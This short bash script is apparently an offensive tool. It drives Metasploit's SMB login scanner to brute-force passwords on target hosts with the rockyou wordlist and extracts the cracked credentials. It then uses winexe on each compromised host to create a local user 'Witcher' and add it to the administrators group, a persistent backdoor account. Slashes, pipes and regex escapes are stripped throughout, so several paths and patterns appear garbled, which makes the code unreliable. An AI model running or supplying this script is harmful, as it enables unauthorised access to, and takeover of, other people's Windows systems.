smb_user=Administrator
while getopts ua option
do
case ${option}
in
	u) smb_user=${OPTARG};;
	a) rhosts=${OPTARG};;
esac
done
rm -f msf3_output.txt
msfconsole -q -x spool msf3_output.txt;
		use auxiliaryscannersmbsmb_login;
		set RHOSTS $rhosts;
		set PASS_FILE usrsharewordlistsrockyou.txt;
		set SMBUser $smb_user;
		set ABORT_ON_LOCKOUT true;
		set STOP_ON_SUCCESS true;
		set BLANK_PASSWORDS true;
		set USER_AS_PASS true;
		set DETECT_ANY_AUTH true;
		set VERBOSE true;
		set DBGTRACE true;
		run;exit;spool off;
grep -oP d.d.d.d.Success.w. .msf3_output.txt  grep -Po (=)[^']+(=')  grep -Po (=- )[^']+(=d -)^w$  sed '$!N;sn ' sed -r 's[ ]+ passwordg'  sed -e 's^Ip'  grep -Po Ip. password.  Creds.txt
while IFS= read -r line; do
    temp_ip=$(echo $line  grep -Po (=Ip).(= ))
    temp_password=$(echo $line  grep -Po (= password).)
    winexe -U $temp_ip$smb_user%$temp_password $temp_ip Net user add Witcher Switcher
    winexe -U $temp_ip$smb_user%$temp_password $temp_ip net localgroup administrators Witcher add
done  Creds.txt
exit